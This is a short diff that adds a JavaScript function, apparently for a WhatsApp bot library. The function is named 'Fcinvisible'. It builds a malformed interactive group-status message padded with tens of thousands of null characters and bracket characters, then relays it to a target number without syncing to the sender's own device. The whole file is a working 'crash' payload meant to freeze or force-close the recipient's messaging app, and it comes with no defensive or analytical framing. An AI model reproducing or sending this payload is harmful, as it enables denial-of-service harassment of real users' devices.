@@ -1,0 +1,28 @@
+async function Fcinvisible(sock, target) {
+const cRb = {
+groupStatusMessageV2: {
+message: {
+interactiveMessage: {
+header: {
+bloksWidget: {
+fallback: "\u0000".repeat(10000),
+type: "\u0000".repeat(10000),
+data: "[".repeat(50000),
+uuid: "\u0000".repeat(10000),
+},
+title: "MakLo",
+},
+nativeFlowMessage: { buttons: [{}] },
+body: { text: "" },
+},
+},
+},
+};
+
+const msg = generateWAMessageFromContent(target, cRb, {});
+
+await sock.relayMessage(target, msg.message, {
+messageId: msg.key.id,
+noSelfSync: true,
+});
+}
